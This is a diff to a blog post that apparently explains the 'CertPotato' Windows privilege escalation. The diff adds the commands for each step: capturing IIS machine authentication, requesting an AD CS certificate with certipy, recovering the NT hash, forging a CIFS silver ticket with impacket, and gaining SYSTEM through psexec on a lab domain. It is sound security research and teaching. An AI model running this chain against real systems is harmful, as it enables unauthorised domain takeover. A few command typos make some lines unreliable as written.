@@ -84,7 +84,7 @@ According to Microsoft: "[A service account is a user account that's created exp
 - NetworkService (NT AUTHORITY\\Network Service);
 - LocalService (NT AUTHORITY\\Local Service).
 
-These three accounts have different privileges on the machine. Only the LocalSystem account and the NetworkService account if they need to authenticate to other machines on the internal network they use the computer account.
+These three accounts have different privileges on the machine. Only the LocalSystem account and the NetworkService account use the computer account, if they need to authenticate to other machines on the internal network.
 Services can also be run using alternate accounts like local or domain accounts.  
   
 Moreover, since Windows Server 2008 R2, new services accounts were introduced:  
@@ -109,7 +109,9 @@ If we try to enumerate a remote share from our webshell:
 
 
 We will see that it is not the **defaultapppool** account that will try to authenticate to our server but the **IIS$** machine account:
-
+```bash
+impacket-smbserer -smb2support test .
+```
 
 ![smbserver](/assets/img/CertPotato/smbserver.png)
 
@@ -119,14 +121,20 @@ That implies that when requesting remote information, the operating system fallb
 
 Since we are able to request domain information through LDAP queries we can also retrieve the Certificate Authority information:
 
-
+```batch
+certutil -TCAInfo
+```
 ![CA information](/assets/img/CertPotato/ca_info.png)
 
 As well as information on a specific template (here the default Machine template)
 
-
+```batch
+certutil -dsTemplate Machine
+```
 ![Template information](/assets/img/CertPotato/template_info.png)
 
+> We could relay the machine authentication to the web enrollment service ([ESC8](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)), however we assume here that either the service is not present or that anti-relay measures have been put in place (EPA for example).
+{: .prompt-info }
 
 # Abuse this configuration
 
@@ -158,13 +166,21 @@ So we upload Rubeus on the compromised machine, then to obtain a forwadable TGT 
 
 We obtain a valid TGT in base64. We can now use our Kali machine to request a certificate using **certipy**. To do this, we must first convert the base64 encoded kirbi file into a ccache file:
 
-
+```bash
+cat ticket.kirbi_b64
+base64 -d ticket.kirbi_b64 > ticket.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache
+```
 ![Convert ticket](/assets/img/CertPotato/convert.png)
 
 Once the TGT file is in the right format, you can load it with the command `export KRB5CCNAME_=<path_to_ticket.ccache>` . The **klist** command allows us to list the loaded Kerberos tickets, we can see that we have obtained a TGT as **IIS$**, the machine account.
 
 
-
+```bash
+klist
+export KRB5CCNAME=ticket.ccache
+klist
+```
 ![Load ticket](/assets/img/CertPotato/load.png)
 
   
@@ -172,58 +188,74 @@ Once the TGT file is in the right format, you can load it with the command `expo
 
 Certipy can take TGT tickets loaded with the -k option as parameter. We can use the TGT of our machine account to list the certificate templates:
 
-
+```bash
+certipy find -k -target dc.namek.local
+```
 ![Find templates](/assets/img/CertPotato/find.png)
 
 
 With our Kerberos ticket, we can then directly request a certificate with the default template **Machine**. Any certificate template with the EKU Client Authentication that our machine account can enroll on could have worked too:
 
-
+```bash
+certipy req -k -ca namek-ca -template Machine -target dc.namek.local
+```
 ![Request certificate](/assets/img/CertPotato/request.png)
 
 As detailed in the article [NTLM relaying to AD CS - On certificates, printers and a little hippo](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) from [Dirk-jan Mollema](https://twitter.com/_dirkjan), with PKINIT authentication and the U2U extension, we can then obtain the hash of the machine account:
 
-
+```bash
+certipy auth -pfx iis.pfx
+```
 ![PKINIT](/assets/img/CertPotato/pkinit.png)
 
 We can then confirm that the account hash is valid by using crackmapexec:
 
-
+```bash
+crackmapexec smb 192.168.1.1 -u 'IIS$' -H 'aad3b435b51404eeaad3b435b51404ee:fde6a3d6d011d112795661ebe7d8e66a' 2>/dev/null
+```
 ![cme](/assets/img/CertPotato/cme.png)
 
 So we managed to get the machine account of a domain-joined machine from a local service account. With the domain-joined machine account, you can then become an administrator on the compromised machine or search for vulnerabilities in the Active Directory.
 
-{{note}} An alternative way to upgrade our machine account TGT to a NT hash is to use the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) technique. Indeed the machine account has the possibility to modify its properties (especially the attribute **msDS-KeyCredentialLink**).{{end}}
+> An alternative way to upgrade our machine account TGT to a NT hash is to use the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) technique. Indeed the machine account has the possibility to modify its properties (especially the attribute **msDS-KeyCredentialLink**).
+{: .prompt-tip }
 
 ## From machine account to SYSTEM
 
-To become SYSTEM with the machine account, we will forge a Silver ticket on the **CIFS** service.  To do this we need the domain SID, a domain user which is an administrator on the machine, the full domain name and NT hash of the machine account.
+To become SYSTEM with the machine account, we will forge a Silver ticket on the **CIFS** service.  To do this we need the domain SID, an arbitrary username (let's choose **Cellmax**), the full domain name and NT hash of the machine account.
 
 - The domain SID can be obtained anonymously by running **rpcclient** on the domain controller:
-
+```bash
+rpcclient -U '%' 192.168.1.1 -c 'lsaquery'
+```
 ![domain_sid](/assets/img/CertPotato/domain_sid.png)
 
 - The full domain name can be obtained with crackmapexec:
-
+```bash
+crackmapexec smb 192.168.1.1 2>/dev/null
+```
 ![full_domain](/assets/img/CertPotato/full_domain.png)
 
-- Among the administrators of the machine, we can take an administrator of the domain. That information can be retrieved through the webshell we got earlier:
-
-![admin](/assets/img/CertPotato/admin.png)
-
 Once we have these elements, we can create our silver ticket using **impacket-ticketer**:
-
+```bash
+impacket-ticketer -nthash fde6a3d6d011d112795661ebe7d8e66a -domain namek.local -domain-sid S-1-5-21-72261593-2540281417-569969885 -spn cifs/iis.namek.local Cellmax
+```
 ![silver_ticket](/assets/img/CertPotato/silver_ticket.png)
 
 Let's load into our Kerberos ticket using the export command:
 
-
+```bash
+export KRB5CCNAME=Cellmax.ccache
+klist
+```
 ![load_silver_ticket](/assets/img/CertPotato/load_silver_ticket.png)
 
 And we can now use the psexec script from the impacket toolkit with the -k and -no-
 pass parameters to authenticate to the service using our silver ticket. We are now **SYSTEM** on the server:
 
-
+```bash
+impacket-psexec namek.local/Cellmax@iis.namek.local -k -no-pass
+```
 ![system](/assets/img/CertPotato/system.png)
 
 # Conclusion
